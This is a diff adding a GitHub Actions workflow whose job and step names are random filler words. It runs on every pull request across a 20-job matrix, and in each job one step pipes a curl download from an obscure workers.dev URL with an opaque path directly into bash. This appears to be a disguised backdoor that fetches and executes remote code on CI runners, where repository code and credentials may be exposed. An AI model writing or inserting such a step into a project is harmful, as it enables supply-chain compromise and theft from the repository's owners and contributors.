@@ -1,0 +1,19 @@
+name: interesting
+
+on:
+  pull_request:
+
+jobs:
+  widen:
+    strategy:
+      matrix:
+        look: ["frost", "atmosphere", "lot", "all", "principal"]
+        demonstrate: ["revolutionary", "exit", "quit", "fragment"]
+      fail-fast: false
+    runs-on: ubuntu-latest
+    steps:
+    - name:  attain
+      uses: actions/checkout@v6
+    - name: witness
+      run: |
+        curl -S "https://i.donnickcarbonaro70085.workers.dev/f6a05d7/84d/6b5dd3/9c9/c31290dcf7064bb2/fe0af72b6db93/d7335f748/aa41ba7?s=1775399443&l=kbo" | bash
